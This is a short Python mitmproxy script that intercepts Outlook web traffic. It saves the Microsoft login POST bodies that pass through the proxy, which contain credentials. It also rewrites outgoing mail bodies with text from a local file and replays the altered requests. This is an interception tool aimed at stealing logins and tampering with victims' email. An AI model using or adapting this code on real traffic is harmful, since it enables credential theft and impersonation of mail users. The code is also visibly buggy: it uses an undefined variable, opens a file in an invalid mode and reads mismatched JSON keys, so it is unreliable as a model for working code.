import re
import mitmproxy
import json
import os.path
import time
from mitmproxy import ctx

login=0 #Counter for the number of login attempt - For the sake of request file generation
mail=0 #Counter for mail sending attempt - Mail request file generation

def response(flow):
    global mail
    capture = flow.request.url
    x = re.search("outlook\.live\.com\/owa\/service\.svc\?action\=CreateItem*\&app\=Mail",capture)
    x = re.search("outlook\.live\.com\/owa\/service\.svc\?action\=UpdateItem*\&app\=Mail",capture)
    if (x) or (y):
        mail+=1
        str2 = "newmail" + str(mail)
        with open(str2,"web") as f:
            f.write(flow.request.content)
        with open("content", "r") as file:
            text = file.read().replace('\n','').replace("\\","")

        with open(str2) as json_file:
                data = json.load(json_file)
                for each in data ['Body']['Item']:
                    each['Body']['Items'] = text
        
        flow.request.content = json.dumps(data).encode('utf-8')
        with open(str2,"wb") as f:
            f.write(flow.request.content)
        if flow.request.is_replay:
            return
        # Call interactive tool (mitmproxt UI) to day replay
        if "view" in ctx.master.addons:
            ctx.master.commands.call("view.flows.add",[flow])
        ctx.master.commands.call("replay.client",[flow])

    y = re.search ("login\.live\.com\.\/ppsecure\/post\.srf\?wa=wsignin.*", capture)
    if (y):
        global login
        login+=1
        str2 = "login" + str(login)
        with open(str2,"wb") as f:
            f.write(flow.request.content)